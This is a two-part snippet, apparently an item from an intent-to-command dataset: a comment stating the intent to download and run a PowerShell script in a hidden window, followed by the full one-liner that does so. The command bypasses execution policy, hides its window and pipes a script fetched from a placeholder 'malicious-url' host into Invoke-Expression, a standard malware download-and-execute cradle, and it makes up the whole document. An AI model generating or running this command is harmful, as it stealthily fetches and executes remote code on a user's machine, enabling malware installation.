# Natural language intent:
# Downloads and executes a PowerShell script from a specified URL with hidden window style.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-url')"
